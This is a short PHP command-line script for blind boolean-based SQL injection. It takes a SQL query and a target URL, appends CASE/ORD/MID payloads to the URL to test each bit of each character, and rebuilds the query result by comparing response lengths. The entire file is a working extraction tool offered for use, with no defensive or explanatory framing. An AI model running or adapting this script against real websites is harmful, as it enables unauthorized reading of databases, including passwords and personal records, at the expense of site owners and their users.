<?php

# non-sense function!
function getlen($ch, $num = 1)
{
    curl_setopt($ch, CURLOPT_BUFFERSIZE, 17408);
    $len = strlen(curl_exec($ch));
    if($len >= 17408)
    {
        curl_setopt($ch, CURLOPT_RESUME_FROM, (17408*$num));
        getlen($ch, $num+1); 
    }
    return $len;
}

function extract_data($data_query, $URL)
{
    print "Query: ".$data_query."\n";

//    global $URL;
    $result = "";
    $bits = array(1, 2, 4, 8, 16, 32, 64, 128);
    $char = 1;

    $URL_pos = $URL . urlencode(" and (case when (ORD(MID((".$data_query."),1,1)) & 1>0) then 1 else 1 end) --");
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $URL_pos);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $len_pos = getlen($ch);
    curl_close($ch);
    print $URL_pos."\n\n";

    while(1)
    {
        $i=0;
        $value=0;
        while($i<8)
        {
            $URL_tst = $URL. urlencode(" and (case when (ORD(MID((".$data_query."),".$char.",1))&".$bits[$i].">0) then 1 else 0 end) --");
            $ch = curl_init();
            curl_setopt($ch,CURLOPT_URL, $URL_tst);
            curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            $len_tst = getlen($ch);
            curl_close($ch);

            if($len_pos == $len_tst)
            {
                $value = $value+$bits[$i];
                print "1 ";
            }
            else
                print "0 ";
            $i++;
        }
        if($value==0)
        {
            print " DONE\n";
            return $result;
        }
        else
        {
            print " => ".$value." => '".chr($value)."'\n";
            $result = $result.chr($value);
            $char++;
        }

    }
}
if($argc!=3) die('[+] [sql query] [url]'."\n");
$data = extract_data($argv[1],$argv[2]);
print "result => ".$data."\n";

?>
